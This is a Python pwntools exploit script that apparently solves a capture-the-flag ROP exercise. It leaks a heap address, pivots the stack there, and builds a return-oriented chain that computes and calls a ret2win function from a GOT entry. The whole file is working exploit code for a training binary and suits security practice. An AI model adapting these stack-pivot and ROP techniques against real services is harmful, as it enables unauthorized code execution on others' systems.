#!/usr/bin/env python2
from pwn import *

# remote connection
p = remote("192.168.56.102", 8888)

# useful address
#main = p32(0x0804873b)
#puts_plt = p32(0x080485d0)
foothold_got = p32(0x0804a024)
foothold_plt = p32(0x080485f0)

# gadgets
leave = p32(0x080486a8)
pop_eax = p32(0x080488c0)
pop_ebx = p32(0x08048946)
mov_eax_dleax = p32(0x080488c4)
add_eax_ebx = p32(0x080488c7)
call_eax = p32(0x080486a3) # mov al,junk; add esp,0x10; leave; ret

# Get heap address
leak_addr = p.recvline_contains("The Old Gods").strip().rsplit(' ', 1)[1]
log.info("Leaked heap address is at: " + str(leak_addr))
heap_addr = u32(unhex(leak_addr[2:]), endian='big')

# Stage one: pivot stack to heap address
pay1 = "A"*40 # not 44 here!
pay1 += p32(heap_addr-4)
pay1 += leave # same as "mov esp,ebp; pop ebp"

# Stage two: calculate ret2win() and call it
pay2 = foothold_plt
pay2 += pop_eax
pay2 += foothold_got # pop foothold_got address into eax
pay2 += mov_eax_dleax # mov foothold_plt address into eax
pay2 += pop_ebx
pay2 += p32(0x1f7) # pop offset into ebx
pay2 += add_eax_ebx # eax now has ret2win_plt address
pay2 += call_eax

p.sendline(pay2)
p.sendline(pay1)
print p.recvall()
